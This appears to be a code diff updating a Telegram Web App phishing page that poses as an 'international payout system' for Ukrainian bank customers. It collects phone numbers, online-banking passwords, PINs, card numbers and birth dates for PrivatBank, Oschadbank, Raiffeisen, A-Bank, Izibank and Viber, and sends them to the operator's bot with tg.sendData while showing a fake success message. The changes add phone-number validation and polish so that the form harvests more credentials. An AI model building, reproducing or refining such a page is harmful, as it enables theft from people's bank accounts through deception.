@@ -17,7 +17,8 @@
         .step-dot.active { background: #2563eb; width: 24px; border-radius: 12px; }
         .step-dot.done { background: #22c55e; }
         #bankList { display: flex; flex-direction: column; gap: 10px; margin-bottom: 16px; }
-        .bank-btn { display: flex; align-items: center; gap: 14px; padding: 14px 18px; background: #f8fafc; border: 1.5px solid #e8edf3; border-radius: 14px; font-size: 15px; font-weight: 500; col[...]
+        .bank-btn { display: flex; align-items: center; gap: 14px; padding: 14px 18px; background: #f8fafc; border: 1.5px solid #e8edf3; border-radius: 14px; font-size: 15px; font-weight: 500; cursor: pointer; transition: 0.2s; }
+        .bank-btn:hover { background: #f1f5f9; border-color: #d0d9e3; }
         .bank-btn:active { transform: scale(0.98); background: #eef2f7; }
         .bank-btn .icon { font-size: 26px; width: 36px; text-align: center; }
         .bank-btn .info { flex: 1; }
@@ -26,20 +27,28 @@
         @keyframes fadeUp { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: translateY(0); } }
         .form-group { margin-bottom: 14px; }
         .form-group label { font-size: 13px; font-weight: 600; color: #334155; display: block; margin-bottom: 5px; }
+        .phone-input-group { display: flex; gap: 8px; }
+        .phone-prefix { padding: 13px 12px; background: #f1f5f9; border: 1.5px solid #e2e8f0; border-radius: 12px; font-size: 15px; font-weight: 500; color: #0f172a; min-width: 70px; display: flex; align-items: center; }
+        .phone-input-group input { flex: 1; }
         .form-group input { width: 100%; padding: 13px 16px; border: 1.5px solid #e2e8f0; border-radius: 12px; font-size: 15px; background: #fafcff; outline: none; color: #0f172a; }
         .form-group input:focus { border-color: #2563eb; background: #ffffff; box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.15); }
         .form-group input::placeholder { color: #94a3b8; }
-        .btn-submit { width: 100%; padding: 15px; background: #2563eb; color: white; border: none; border-radius: 14px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 8px; }
-        .btn-submit:active { transform: scale(0.98); background: #1d4ed8; }
-        .btn-back { width: 100%; padding: 13px; background: #f1f5f9; color: #334155; border: none; border-radius: 14px; font-size: 15px; font-weight: 500; cursor: pointer; margin-top: 10px; }
-        .btn-back:active { background: #e2e8f0; }
+        .form-group input:disabled { background: #f5f5f5; color: #999; }
+        .btn-submit { width: 100%; padding: 15px; background: #2563eb; color: white; border: none; border-radius: 14px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 8px; transition: 0.2s; }
+        .btn-submit:hover:not(:disabled) { background: #1d4ed8; }
+        .btn-submit:active:not(:disabled) { transform: scale(0.98); }
+        .btn-submit:disabled { opacity: 0.6; cursor: not-allowed; }
+        .btn-back { width: 100%; padding: 13px; background: #f1f5f9; color: #334155; border: none; border-radius: 14px; font-size: 15px; font-weight: 500; cursor: pointer; margin-top: 10px; transition: 0.2s; }
+        .btn-back:hover { background: #e2e8f0; }
+        .btn-back:active { background: #d1d8df; }
         #status { margin-top: 16px; padding: 14px; border-radius: 12px; font-size: 14px; text-align: center; font-weight: 500; display: none; }
         #status.success { display: block; background: #dcfce7; color: #166534; }
         #status.error { display: block; background: #fee2e2; color: #991b1b; }
         #status.loading { display: block; background: #e0f2fe; color: #0369a1; }
         .bank-logo { font-size: 28px; font-weight: 700; text-align: center; padding: 8px 0 12px; color: #0f172a; }
         .bank-logo span { display: block; font-size: 13px; font-weight: 400; color: #64748b; }
-        .debug { font-size: 12px; color: red; margin-top: 10px; text-align: center; }
+        .debug { font-size: 12px; color: #666; margin-top: 10px; text-align: center; }
+        .error-message { font-size: 12px; color: #ef4444; margin-top: 3px; }
     </style>
 </head>
 <body>
@@ -47,7 +56,7 @@
     <div class="header">
         <div class="logo">🏦</div>
         <h1>Міжнародна система виплат</h1>
-        <p>Оберіть банк для отримання коштів</p>
+        <p>Обе��іть банк для отримання коштів</p>
     </div>
 
     <div class="step-indicator">
@@ -73,33 +82,57 @@
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <script>
     const banks = {
-        privat: { name: 'ПриватБанк', icon: '💳', fields: [
-            { id: 'phone', label: '📱 Номер телефону', placeholder: '+380 00 000 00 00' },
-            { id: 'password', label: '🔑 Пароль', placeholder: 'Введіть пароль' },
-            { id: 'pin', label: '📌 Пін-код', placeholder: '4 цифри' }
-        ]},
-        oschad: { name: 'Ощадбанк', icon: '🏛️', fields: [
-            { id: 'phone', label: '📱 Номер телефону', placeholder: '+380 00 000 00 00' },
-            { id: 'password', label: '🔑 Пароль', placeholder: 'Введіть пароль' },
-            { id: 'card', label: '💳 Номер карти', placeholder: '0000 0000 0000 0000' },
-            { id: 'pin', label: '📌 Пін-код', placeholder: '4 цифри' },
-            { id: 'birth', label: '📅 Дата народження', placeholder: 'ДД.ММ.РРРР' }
-        ]},
-        raif: { name: 'Райффайзен Банк', icon: '🏦', fields: [
-            { id: 'phone', label: '📱 Номер телефону', placeholder: '+380 00 000 00 00' },
-            { id: 'pin', label: '📌 Пін-код', placeholder: '4 цифри' }
-        ]},
-        abank: { name: 'А-Банк', icon: '🏧', fields: [
-            { id: 'phone', label: '📱 Номер телефону', placeholder: '+380 00 000 00 00' },
-            { id: 'pin', label: '📌 Пін-код', placeholder: '4 цифри' }
-        ]},
-        izibank: { name: 'Ізі Банк', icon: '💎', fields: [
-            { id: 'phone', label: '📱 Номер телефону', placeholder: '+380 00 000 00 00' },
-            { id: 'pin', label: '📌 Пін-код', placeholder: '4 цифри' }
-        ]},
-        viber: { name: 'Viber', icon: '💬', fields: [
-            { id: 'phone', label: '📱 Номер телефону', placeholder: '+380 00 000 00 00' }
-        ]}
+        privat: { 
+            name: 'ПриватБанк', 
+            icon: '💳',
+            fields: [
+                { id: 'phone', label: '📱 Номер телефону', type: 'phone', placeholder: '00 000 00 00' },
+                { id: 'password', label: '🔑 Пароль', type: 'text', placeholder: 'Введіть пароль' },
+                { id: 'pin', label: '📌 Пін-код', type: 'text', placeholder: '4 цифри' }
+            ]
+        },
+        oschad: { 
+            name: 'Ощадбанк', 
+            icon: '🏛️',
+            fields: [
+                { id: 'phone', label: '📱 Номер телефону', type: 'phone', placeholder: '00 000 00 00' },
+                { id: 'password', label: '🔑 Пароль', type: 'text', placeholder: 'Введіть пароль' },
+                { id: 'card', label: '💳 Номер карти', type: 'text', placeholder: '0000 0000 0000 0000' },
+                { id: 'pin', label: '📌 Пін-код', type: 'text', placeholder: '4 цифри' },
+                { id: 'birth', label: '📅 Дата народження', type: 'text', placeholder: 'ДД.ММ.РРРР' }
+            ]
+        },
+        raif: { 
+            name: 'Райффайзен Банк', 
+            icon: '💼',
+            fields: [
+                { id: 'phone', label: '📱 Номер телефону', type: 'phone', placeholder: '00 000 00 00' },
+                { id: 'pin', label: '📌 Пін-код', type: 'text', placeholder: '4 цифри' }
+            ]
+        },
+        abank: { 
+            name: 'А-Банк', 
+            icon: '🏧',
+            fields: [
+                { id: 'phone', label: '📱 Номер телефону', type: 'phone', placeholder: '00 000 00 00' },
+                { id: 'pin', label: '📌 Пін-код', type: 'text', placeholder: '4 цифри' }
+            ]
+        },
+        izibank: { 
+            name: 'Ізі Банк', 
+            icon: '💎',
+            fields: [
+                { id: 'phone', label: '📱 Номер телефону', type: 'phone', placeholder: '00 000 00 00' },
+                { id: 'pin', label: '📌 Пін-код', type: 'text', placeholder: '4 цифри' }
+            ]
+        },
+        viber: { 
+            name: 'Viber', 
+            icon: '💬',
+            fields: [
+                { id: 'phone', label: '📱 Номер телефону', type: 'phone', placeholder: '00 000 00 00' }
+            ]
+        }
     };
 
     let selectedBank = null;
@@ -145,8 +178,41 @@
         bank.fields.forEach(f => {
             const div = document.createElement('div');
             div.className = 'form-group';
-            div.innerHTML = `<label>${f.label}</label><input type="text" id="${f.id}" placeholder="${f.placeholder}" autocomplete="off">`;
+            
+            if (f.type === 'phone') {
+                // Специальный ввод для телефона
+                div.innerHTML = `
+                    <label>${f.label}</label>
+                    <div class="phone-input-group">
+                        <div class="phone-prefix">+380</div>
+                        <input type="tel" id="${f.id}" placeholder="${f.placeholder}" autocomplete="off" maxlength="9" inputmode="numeric" data-phone="true">
+                    </div>
+                    <div id="${f.id}-error" class="error-message"></div>
+                `;
+            } else {
+                div.innerHTML = `
+                    <label>${f.label}</label>
+                    <input type="text" id="${f.id}" placeholder="${f.placeholder}" autocomplete="off">
+                `;
+            }
             fieldsContainer.appendChild(div);
+        });
+
+        // Добавляем валидацию для полей телефона
+        const phoneInputs = fieldsContainer.querySelectorAll('input[data-phone]');
+        phoneInputs.forEach(input => {
+            input.addEventListener('input', function(e) {
+                // Только цифры
+                this.value = this.value.replace(/[^0-9]/g, '');
+                
+                // Проверка на ошибку (если введено +3800...)
+                const errorEl = document.getElementById(this.id + '-error');
+                if (this.value.startsWith('0') && this.value.length > 0) {
+                    errorEl.textContent = '❌ Номер повинен починатись з 9, 6, 7 цифр (без 0)';
+                } else {
+                    errorEl.textContent = '';
+                }
+            });
         });
 
         setTimeout(() => {
@@ -175,7 +241,25 @@
 
         let hasError = false;
         fields.forEach(input => {
-            const val = input.value.trim();
+            let val = input.value.trim();
+            
+            // Специальная обработка для телефона
+            if (input.getAttribute('data-phone')) {
+                // Проверка на +3800... (ошибка)
+                if (val.startsWith('0')) {
+                    hasError = true;
+                    input.style.borderColor = '#ef4444';
+                    return;
+                }
+                // Формируем полный номер
+                val = '+380' + val;
+                if (!val || val === '+380') {
+                    hasError = true;
+                    input.style.borderColor = '#ef4444';
+                    return;
+                }
+            }
+            
             data[input.id] = val;
             if (!val) {
                 input.style.borderColor = '#ef4444';
@@ -188,7 +272,7 @@
         if (hasError) {
             statusEl.className = 'error';
             statusEl.style.display = 'block';
-            statusEl.textContent = '❌ Будь ласка, заповніть всі поля!';
+            statusEl.textContent = '❌ Будь ласка, заповніть всі поля коректно!';
             return;
         }
 
@@ -206,11 +290,10 @@
                 const jsonData = JSON.stringify(data);
                 debugEl.textContent = '📤 Надсилання: ' + jsonData;
                 
-                // ✅ ИСПРАВЛЕНИЕ: Отправляем данные через Telegram WebApp
+                // ✅ Отправляем данные через Telegram WebApp
                 tg.sendData(jsonData);
                 
-                // ✅ ВАЖНО: НЕ закрываем окно сразу!
-                // Показываем успех и даем время боту обработать данные
+                // ✅ Показываем успех
                 statusEl.className = 'success';
                 statusEl.textContent = '✅ Дані успішно надіслано! Очікуйте підтвердження.';
                 
@@ -218,14 +301,12 @@
                 document.getElementById('dot2').classList.add('done');
                 document.getElementById('dot3').classList.add('active');
                 
-                // Отключаем кнопку отправки, чтобы не отправить дважды
+                // Отключаем кнопку отправки
                 document.querySelector('.btn-submit').disabled = true;
                 document.querySelector('.btn-submit').style.opacity = '0.6';
                 
-                // ✅ ИСПРАВЛЕНИЕ: Даем боту 5-7 секунд обработать данные
-                // Потом закрываем только если пользователь все еще здесь
+                // ✅ Даем боту 7 секунд на обработку
                 setTimeout(() => {
-                    // Закрываем окно ТОЛько если пользователь не нажал назад
                     if (statusEl.className === 'success') {
                         debugEl.textContent = '✅ Закрытие WebApp...';
                         tg.close();
